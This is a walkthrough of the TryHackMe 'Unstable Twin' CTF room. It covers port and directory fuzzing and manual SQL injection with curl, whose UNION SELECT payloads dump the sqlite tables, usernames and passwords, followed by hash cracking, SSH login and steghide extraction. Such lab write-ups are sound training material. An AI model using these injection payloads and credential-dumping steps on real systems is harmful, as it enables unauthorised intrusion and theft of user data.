---
title: "Walk-through of Unstable Twin from TryHackMe"
header:
  teaser: /assets/images/2021-05-19-17-21-20.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - Ffuf
  - 
---

## Machine Information

![unstable](/assets/images/2021-05-19-17-21-20.png)

Unstable Twin is a medium difficulty room on TryHackMe. An initial scan reveals just two ports are open. After some enumeration we find a web service API listening on port 80. Further enumeration finds a login which is vulnerable to SQL injection. We dump credentials from the underlying sqlite database and use them to login via SSH. From there we find pictures, which via Steghide reveal hidden text. We then use CyberChef to combine and decode the final flag.

<!--more-->

Skills required are basic enumeration and file manipulation. Skills learned fuzzing using Ffuf and manually performing SQLi using Curl.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - Unstable Twin](https://tryhackme.com/room/unstabletwin) |
| Machine Release Date | 14th February 2021 |
| Date I Completed It | 12th May 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with nmap:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.247.188 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/thm/unstable]
└─# nmap -p$ports -Pn -sC -sV -oA unstable 10.10.247.188
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-12 22:00 BST
Nmap scan report for unstable.thm (10.10.247.188)
Host is up (0.026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 ba:a2:40:8e:de:c3:7b:c7:f7:b3:7e:0c:1e:ec:9f:b8 (RSA)
|   256 38:28:4c:e1:4a:75:3d:0d:e7:e4:85:64:38:2a:8e:c7 (ECDSA)
|_  256 1a:33:a0:ed:83:ba:09:a5:62:a7:df:ab:2f:ee:d0:99 (ED25519)
80/tcp open  http    nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.00 seconds
```

Just two open ports. SSH may be used later, for now we start with nginx running on port 80. However when we visit that address in our browser we have an empty page with no content at all. May as well try gobuster and see if we can find anything:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://unstable.thm    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://unstable.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/05/12 22:00:20 Starting gobuster in directory enumeration mode
===============================================================
http://unstable.thm/info                 (Status: 200) [Size: 160]
===============================================================
2021/05/12 22:14:32 Finished
===============================================================
```

## Enumeration

Just one folder is found, let's try it:

![unstable-web-info](/assets/images/2021-05-12-22-01-35.png)

We have a message about an API that needs authenticating to. Let's see what Curl shows us in verbose mode:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl http://unstable.thm/info -v
*   Trying 10.10.247.188:80...
* Connected to unstable.thm (10.10.247.188) port 80 (#0)
> GET /info HTTP/1.1
> Host: unstable.thm
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Wed, 12 May 2021 21:40:20 GMT
< Content-Type: application/json
< Content-Length: 160
< Connection: keep-alive
< Build Number: 1.3.4-dev
< Server Name: Vincent
< 
"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"
* Connection #0 to host unstable.thm left intact
```

I also noticed if I do a Curl again I get a different server:

```text
< Content-Length: 148
< Connection: keep-alive
< Build Number: 1.3.6-final
< Server Name: Julias
```

The above message says there is a login API, I tried to POST to /api and I see this:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST http://unstable.thm/api
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

I wondered why /api didn't show up with my gobuster scan above, so I tried Ffuf and after a little playing with options I found this:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# ffuf -mc all -fs 233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://unstable.thm/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://unstable.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 233
________________________________________________
info                    [Status: 200, Size: 160, Words: 31, Lines: 2]
api                     [Status: 404, Size: 0, Words: 1, Lines: 1]
:: Progress: [220547/220547] :: Job [1/1] :: 0 req/sec :: Duration: [0:37:24] :: Errors: 0 ::
```

So Ffuf found the api folder by telling it to show responses for all status codes. The 404 response for an API endpoint is described [here](https://restfulapi.net/http-status-codes) like this:

```text
404 (Not Found)
The 404 error status code indicates that the REST API can’t map the client’s URI to a resource but may be available in the future. Subsequent requests by the client are permissible.
```

From this we take it that there is something else beyond this API, so we run Ffuf again and look what is after /api:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# ffuf -mc all -fs 233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://unstable.thm/api/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://unstable.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 233
________________________________________________
login                   [Status: 405, Size: 178, Words: 20, Lines: 5]
:: Progress: [220547/220547] :: Job [1/1] :: 0 req/sec :: Duration: [0:37:24] :: Errors: 0 ::
```

## SQLi using Curl

Ok. Now we're looking good. We've found a login endpoint. Let's have a look at that with Curl:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST http://unstable.thm/api/login
"The username or password passed are not correct."
```

How about trying default credentials:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin"
"The username or password passed are not correct."
```

Let's check for SQL injection vulnerabilities. [Here](https://github.com/payloadbox/sql-injection-payload-list) is a good list of payloads if you need it, i'll use the first one which is appending apostrophe after the password:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin'"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
```

This response tells us the app is indeed vulnerable. Let's try to further enumerate information by first confirming what type of database is in use. [This](http://www.securityidiots.com/Web-Pentest/SQL-Injection/database-type-testing-sql-injection.html) is a good article showing how to detect the various possibilities. Knowing this is a Linux box I tried the SQLite one and got this response:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin'UNION SELECT 1,sqlite_version()--"
[
  [
    1, 
    "3.26.0"
  ]
]
```

So we know we are dealing with sqlite version 3.26.0. Let's get a list of tables, using [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) to help us:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin'UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--"
[
  [
    1, 
    "notes"
  ], 
  [
    1, 
    "users"
  ]
]
```

We have two tables, let's look at the users:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'users')--"
[
  [
    1, 
    "CREATE TABLE \"users\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"username\"\tTEXT NOT NULL UNIQUE,\n\t\"password\"\tTEXT NOT NULL UNIQUE,\n\tPRIMARY KEY(\"id\" AUTOINCREMENT)\n)"
  ]
]
```

Now we know the column names we can extract the data:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,group_concat(username) from users--"
[
  [
    1, 
    "julias,linda,marnie,mary_ann,vincent"
  ]
]
```

We have five users, let's get their passwords:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,group_concat(password) from users--"
[
  [
    1, 
    "Green,Orange,Red,Yellow ,continue..."
  ]
]
```

Let's have a look at the other table, this one was called notes:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'notes')--"
[
  [
    1, 
    "CREATE TABLE \"notes\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"user_id\"\tINTEGER,\n\t\"note_sql\"\tINTEGER,\n\t\"notes\"\tTEXT,\n\tPRIMARY KEY(\"id\")\n)"
  ]
]
```

I looked through the columns in the notes table, and found something interesting in the notes column:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,notes FROM notes-- -"
[
  [
    1, 
    "I have left my notes on the server.  They will me help get the family back together. "
  ], 
  [
    1, 
    "My Password is <HIDDEN>"
  ]
]
```

## Hash Cracking

We have a password, which looks more like a hash, let's check it out:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# hash-identifier <HIDDEN>
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-512
[+] Whirlpool
--------------------------------------------------
```

It is indeed a hash, we can try to crack it with JohnTheRipper:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# john hashes.txt --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>       (?)
1g 0:00:00:00 DONE (2021-05-17 22:22) 100.0g/s 204800p/s 204800c/s 204800C/s i<3ruby..sisters
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## User Flag

That was easy! Let's try this password with the users we dumped from the database, and try to log in via SSH:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# ssh mary_ann@unstable.thm
The authenticity of host 'unstable.thm (10.10.247.188)' can't be established.
ECDSA key fingerprint is SHA256:WrxENvyCyn7qV22+7snQxO8tTSOptNI4dnZ764XnDhk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'unstable.thm,10.10.247.188' (ECDSA) to the list of known hosts.
mary_ann@unstable.thm's password: 
Last login: Sun Feb 14 09:56:18 2021 from 192.168.20.38
Hello Mary Ann
[mary_ann@UnstableTwin ~]$
```

It turned out to be the user mary_anns password. A look around her home folder finds the user flag:

```text
[mary_ann@UnstableTwin ~]$ ls -lsa
total 24
0 drwx------. 3 mary_ann mary_ann 138 Feb 13 10:18 .
0 drwxr-xr-x. 3 root     root      22 Feb 13 09:31 ..
4 -rw-------. 1 mary_ann mary_ann 115 Feb 13 10:24 .bash_history
4 -rw-r--r--. 1 mary_ann mary_ann  18 Jul 21  2020 .bash_logout
4 -rw-r--r--. 1 mary_ann mary_ann 141 Jul 21  2020 .bash_profile
4 -rw-r--r--. 1 mary_ann mary_ann 424 Feb 13 10:18 .bashrc
0 drwx------. 2 mary_ann mary_ann  44 Feb 13 09:51 .gnupg
4 -rw-r--r--. 1 mary_ann mary_ann 219 Feb 13 10:13 server_notes.txt
4 -rw-r--r--. 1 mary_ann mary_ann  20 Feb 13 10:15 user.flag

[mary_ann@UnstableTwin ~]$ cat user.flag 
THM{<HIDDEN>}
```

We also find a file called server_notes, let's have a look:

```text
[mary_ann@UnstableTwin ~]$ cat server_notes.txt 
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.

You need to find all of them and a picture of myself!
```

## Twins Pictures

Looking around the file system I found this subfolder:

```text
[mary_ann@UnstableTwin unstabletwin]$ ls -la
total 628
drwxr-xr-x. 3 root root    288 Feb 13 12:13  .
drwxr-xr-x. 3 root root     26 Feb 13 09:30  ..
-rw-r--r--. 1 root root  40960 Feb 13 11:17  database.db
-rw-r--r--. 1 root root   1214 Feb 13 10:49  main_5000.py
-rw-r--r--. 1 root root   1837 Feb 13 12:13  main_5001.py
drwxr-xr-x. 2 root root     36 Feb 13 10:25  __pycache__
-rw-r--r--. 1 root root    934 Feb 13 10:24  queries.py
-rw-r--r--. 1 root root 320277 Feb 10 15:43 'Twins (1988).html'
-rw-r--r--. 1 root root  56755 Feb 13 10:23  Twins-Arnold-Schwarzenegger.jpg
-rw-r--r--. 1 root root  47303 Feb 13 10:23  Twins-Bonnie-Bartlett.jpg
-rw-r--r--. 1 root root  50751 Feb 13 10:23  Twins-Chloe-Webb.jpg
-rw-r--r--. 1 root root  42374 Feb 13 10:23  Twins-Danny-DeVito.jpg
-rw-r--r--. 1 root root  58549 Feb 13 10:23  Twins-Kelly-Preston.jpg
```

I'm assuming those jpgs are the images mentioned in the previous text file we found. I was going to start a web server on Kali and pull them over, but first had a look at the other files. The main_5000.py and main_5001.py files contain the code for the API I've been using to enumerate the sqlite database. They also reveal another one I'd not found before:

```text
@app.route('/get_image')
def get_image():
    if request.args.get('name').lower() == 'vincent':
        filename = 'Twins-Danny-DeVito.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'julias':
        filename = 'Twins-Arnold-Schwarzenegger.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'mary_ann':
        filename = 'Twins-Bonnie-Bartlett.jpg'
        return send_file(filename, mimetype='image/gif')
    return '', 404
```

I can use this one to grab the pictures, let's try it:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# curl http://unstable.thm/get_image?name=\julias --output julias.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 56755  100 56755    0     0   423k      0 --:--:-- --:--:-- --:--:--  423k
```

That worked. Repeat for all the user names we've found before. Also remember that you may have to do it twice to get the file. Once completed I have them all on Kali:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# ls -ls 
 56 -rw-r--r-- 1 root root  56755 May 17 22:48 julias.jpg
 52 -rw-r--r-- 1 root root  50751 May 17 22:51 linda.jpg
 60 -rw-r--r-- 1 root root  58549 May 17 22:52 marnie.jpg
 48 -rw-r--r-- 1 root root  47303 May 17 22:51 mary_ann.jpg
 44 -rw-r--r-- 1 root root  42374 May 17 22:49 vincent.jpg
```

## Steghide

What do we normally expect with pictures in a CTF? Steganography of course!

Let's use steghide and see what we can find:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# steghide --extract -sf linda.jpg 
Enter passphrase: 
wrote extracted data to "linda.txt".
```

As expected, a hidden text file. Repeat this for each picture, so we have five text files which look like this:

```text
┌──(root💀kali)-[~/thm/unstable]
└─# more julias.txt
Red - <HIDDEN>

┌──(root💀kali)-[~/thm/unstable]
└─# more linda.txt
Green - <HIDDEN>

┌──(root💀kali)-[~/thm/unstable]
└─# more marnie.txt
Yellow - <HIDDEN>

┌──(root💀kali)-[~/thm/unstable]
└─# more vincent.txt
Orange - <HIDDEN>

┌──(root💀kali)-[~/thm/unstable]
└─# more mary_ann.txt 
You need to find all my children and arrange in a rainbow!
```

## CyberChef

We have four text strings, each proceeded with a colour and the clue is to arrange them in the order of the rainbow. We all know that's Red, Orange, Yellow and Green. Combined we end up with this:

```text
1D<HIDDEN>HoNG1
```

Clearly that string is encrypted in some way. The easiest thing to do is use [CyberChef](https://gchq.github.io/CyberChef/), filter the operations by "from" as we are assuming we decrypting from some method of encoding back to ASCII. Then just try them all one at a time, it takes a while but eventually you find this one:

![unstable-cyberchef](/assets/images/2021-05-18-22-44-32.png)

At last we've got our final flag!

I hope you enjoyed this room as much as I did. For now we are all done. See you next time.
